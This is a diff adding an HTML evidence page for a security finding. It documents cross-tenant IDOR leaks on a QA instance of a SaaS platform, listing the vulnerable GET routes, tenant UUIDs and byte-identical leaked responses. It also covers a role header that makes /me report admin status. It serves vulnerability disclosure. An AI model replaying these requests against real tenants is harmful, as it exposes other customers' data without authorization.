@@ -1,0 +1,111 @@
+<!doctype html><html><head><meta charset="utf-8"><title>Cross-tenant IDOR evidence</title></head>
+<body style="margin:0;background:#0d1117;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;color:#c9d1d9">
+<div style="max-width:1080px;margin:auto;padding:24px">
+  <h1 style="color:#f85149;font-size:22px;margin:0 0 4px">Cross-tenant IDOR — LIVE on QA · <span style="color:#c9d1d9">by-&lt;scope&gt;/{id} route family</span></h1>
+  <div style="color:#8b949e;font-size:12px;margin-bottom:6px">Verified 2026-08-14 · acme.qa.egalvanic.ai (build V1.36) · attacker tenant EG-ACME reading tenant Demo.
+  Bodies below were captured live from a browser session on <b style="color:#58a6ff">https://acme.qa.egalvanic.ai</b> (fetch returned sandbox@egalvanic.com for LEAK 1).</div>
+
+  <div style="background:#161b22;border:1px solid #30363d;border-radius:8px;padding:12px;margin:14px 0">
+    <span style="color:#7ee787;font-weight:bold">CALLER IDENTITY</span> &nbsp; company_id <b style="color:#58a6ff">d59d449b-09d8-45d6-8f0a-ef70024b1293</b> (EG-ACME) &nbsp;·&nbsp;
+    is_eg_admin <b style="color:#f85149">false</b> &nbsp;·&nbsp; role Super Admin &nbsp;
+    <span style="color:#8b949e">— a plain customer admin, not internal EG staff. Target tenant Demo = 93611164-13e6-47da-b2cd-a150e73173f6.</span>
+  </div>
+
+  <div style="background:#161b22;border:1px solid #f85149;border-radius:8px;padding:14px;margin-bottom:12px">
+      <div style="color:#f85149;font-weight:bold;font-size:14px">LEAK 1 · GET /api/contact/by-sld/24eb08b1-bb88-4f47-8ad0-f5b09326cf8d</div>
+      <div style="color:#8b949e;font-size:12px;margin-bottom:2px">Returns another tenant&#x27;s CONTACT PII (name, email, job title).</div>
+      <div style="color:#ffa657;font-size:11px;margin-top:6px">ATTACKER (acme, is_eg_admin=false) → HTTP 200 452b:</div><pre style="background:#0d1117;padding:10px;border-radius:6px;overflow:auto;color:#ffa657;font-size:12px;margin:6px 0;line-height:1.45">{
+  &quot;contacts&quot;: [
+    {
+      &quot;created_at&quot;: &quot;2026-07-30T06:39:03Z&quot;,
+      &quot;email&quot;: &quot;sandbox@egalvanic.com&quot;,
+      &quot;firstname&quot;: &quot;Test&quot;,
+      &quot;full_name&quot;: &quot;Test test&quot;,
+      &quot;id&quot;: &quot;a414376c-0e42-4403-afd7-f41a71f5e829&quot;,
+      &quot;is_default&quot;: true,
+      &quot;is_deleted&quot;: false,
+      &quot;job_title&quot;: &quot;Test&quot;,
+      &quot;lastname&quot;: &quot;test&quot;,
+      &quot;modified_at&quot;: &quot;2026-07-30T06:41:53Z&quot;,
+      &quot;phone&quot;: null,
+      &quot;primary_site_id&quot;: null
+    }
+  ],
+  &quot;success&quot;: true
+}</pre>
+      <div style="color:#7ee787;font-size:11px">GROUND TRUTH — Demo's OWN session, same id → HTTP 200 452b (byte-identical body = same record):</div><pre style="background:#0d1117;padding:10px;border-radius:6px;overflow:auto;color:#7ee787;font-size:11px;margin:6px 0;line-height:1.45">{
+  &quot;contacts&quot;: [
+    {
+      &quot;created_at&quot;: &quot;2026-07-30T06:39:03Z&quot;,
+      &quot;email&quot;: &quot;sandbox@egalvanic.com&quot;,
+      &quot;firstname&quot;: &quot;Test&quot;,
+      &quot;full_name&quot;: &quot;Test test&quot;,
+      &quot;id&quot;: &quot;a414376c-0e42-4403-afd7-f41a71f5e829&quot;,
+      &quot;is_default&quot;: true,
+      &quot;is_deleted&quot;: false,
+      &quot;job_title&quot;: &quot;Test&quot;,
+      &quot;lastname&quot;: &quot;test&quot;,
+      &quot;modified_at&quot;: &quot;2026-07-30T06:41:53Z&quot;,
+      &quot;phone&quot;: null,
+      &quot;primary_site_id&quot;: null
+    }
+  ],
+  &quot;success&quot;: true
+}</pre><div style="color:#8b949e;font-size:11px">controls — acme OWN sld returns acme own contacts (['abhiyant.singh@egalvanic.com', 'abhiyant.singh+test@egalvanic.com']); RANDOM sld returns HTTP 200 masked-404 (SPA shell). The route filters by sld but never checks the sld belongs to the caller tenant.</div></div>
+
+  <div style="background:#161b22;border:1px solid #f85149;border-radius:8px;padding:14px;margin-bottom:12px">
+      <div style="color:#f85149;font-weight:bold;font-size:14px">LEAK 2 · GET /api/issues/open-by-site?company_id=93611164-13e6-47da-b2cd-a150e73173f6</div>
+      <div style="color:#8b949e;font-size:12px;margin-bottom:2px">Query-param tenant selector — leaks another tenant&#x27;s site names + open-issue counts.</div>
+      <div style="color:#ffa657;font-size:11px;margin-top:6px">ATTACKER (acme, is_eg_admin=false) → HTTP 200 165b:</div><pre style="background:#0d1117;padding:10px;border-radius:6px;overflow:auto;color:#ffa657;font-size:12px;margin:6px 0;line-height:1.45">{
+  &quot;sites&quot;: [
+    {
+      &quot;count&quot;: 2,
+      &quot;sld_id&quot;: &quot;d1641610-308d-4e4a-a0ab-4bf0a2a9232c&quot;,
+      &quot;sld_name&quot;: &quot;Demo&quot;
+    }
+  ],
+  &quot;success&quot;: true,
+  &quot;total&quot;: 2
+}</pre>
+      <div style="color:#7ee787;font-size:11px">GROUND TRUTH — Demo's OWN session, same id → HTTP 200 165b (byte-identical body = same record):</div><pre style="background:#0d1117;padding:10px;border-radius:6px;overflow:auto;color:#7ee787;font-size:11px;margin:6px 0;line-height:1.45">{
+  &quot;sites&quot;: [
+    {
+      &quot;count&quot;: 2,
+      &quot;sld_id&quot;: &quot;d1641610-308d-4e4a-a0ab-4bf0a2a9232c&quot;,
+      &quot;sld_name&quot;: &quot;Demo&quot;
+    }
+  ],
+  &quot;success&quot;: true,
+  &quot;total&quot;: 2
+}</pre><div style="color:#8b949e;font-size:11px">controls — acme OWN company_id → 832 issues across acme sites; RANDOM company_id → total 0 (empty). The company_id param is honoured with no tenant check.</div></div>
+
+  <div style="background:#161b22;border:1px solid #f85149;border-radius:8px;padding:14px;margin-bottom:12px">
+      <div style="color:#f85149;font-weight:bold;font-size:14px">LEAK 3 · GET /api/mapping/node-session/by-session/0c3794e1-d817-4189-9f61-0ebaee93d70d</div>
+      <div style="color:#8b949e;font-size:12px;margin-bottom:2px">Leaks another tenant&#x27;s session→node mapping.</div>
+      <div style="color:#ffa657;font-size:11px;margin-top:6px">ATTACKER (acme, is_eg_admin=false) → HTTP 200 86b:</div><pre style="background:#0d1117;padding:10px;border-radius:6px;overflow:auto;color:#ffa657;font-size:12px;margin:6px 0;line-height:1.45">{
+  &quot;node_ids&quot;: [
+    &quot;d435fd13-435b-4c7f-b55a-9452e82908f7&quot;
+  ],
+  &quot;success&quot;: true
+}</pre>
+      <div style="color:#7ee787;font-size:11px">GROUND TRUTH — Demo's OWN session, same id → HTTP 200 86b (byte-identical body = same record):</div><pre style="background:#0d1117;padding:10px;border-radius:6px;overflow:auto;color:#7ee787;font-size:11px;margin:6px 0;line-height:1.45">{
+  &quot;node_ids&quot;: [
+    &quot;d435fd13-435b-4c7f-b55a-9452e82908f7&quot;
+  ],
+  &quot;success&quot;: true
+}</pre><div style="color:#8b949e;font-size:11px">control — acme OWN session → None (empty).</div></div>
+
+  <div style="background:#161b22;border:1px solid #3fb950;border-radius:8px;padding:14px;margin-bottom:12px">
+    <div style="color:#7ee787;font-weight:bold;font-size:14px">CONTRAST — the ORIGINALLY-REPORTED routes ARE fixed</div>
+    <div style="color:#8b949e;font-size:12px">GET /api/company/93611164-13e6-47da-b2cd-a150e73173f6/slds → HTTP <b style="color:#7ee787">422</b> &nbsp; {&quot;error&quot;: &quot;permission_denied&quot;, &quot;message&quot;: &quot;You do not have access to this company&#x27;s data.&quot;, &quot;success&quot;: false}</div>
+    <div style="color:#8b949e;font-size:12px">POST /api/account/by-company/93611164-13e6-47da-b2cd-a150e73173f6/v2 → HTTP <b style="color:#7ee787">422</b> &nbsp; {&quot;error&quot;: &quot;permission_denied&quot;, &quot;message&quot;: &quot;You do not have access to this company&#x27;s data.&quot;, &quot;success&quot;: false}</div>
+    <div style="color:#8b949e;font-size:11px;margin-top:6px">The /company/{id}/* guard works and now also covers account/by-company. The by-&lt;scope&gt;/{id} family never received the same tenant check — the breach moved, it did not close.</div>
+  </div>
+
+  <div style="background:#161b22;border:1px solid #d29922;border-radius:8px;padding:14px">
+    <div style="color:#d29922;font-weight:bold;font-size:13px">SECONDARY OBSERVATION · x-active-role-id honours a role the account does not hold</div>
+    <div style="color:#8b949e;font-size:12px">GET /api/auth/v2/me with header x-active-role-id = &lt;owned Super Admin&gt; → is_eg_admin <b>False</b>, roles ['Super Admin']</div>
+    <div style="color:#8b949e;font-size:12px">GET /api/auth/v2/me with header x-active-role-id = &lt;EG-Admin overlay the acme account does NOT list&gt; → is_eg_admin <b style="color:#f85149">True</b>, roles ['Admin']</div>
+    <div style="color:#8b949e;font-size:11px;margin-top:6px">/me reflected is_eg_admin=true for an unowned role. The cross-tenant guard held regardless (foreign reads still 422), so no data leak via this path — but whether this elevates any OTHER authorization decision was not tested and is worth a separate look.</div>
+  </div>
+</div></body></html>
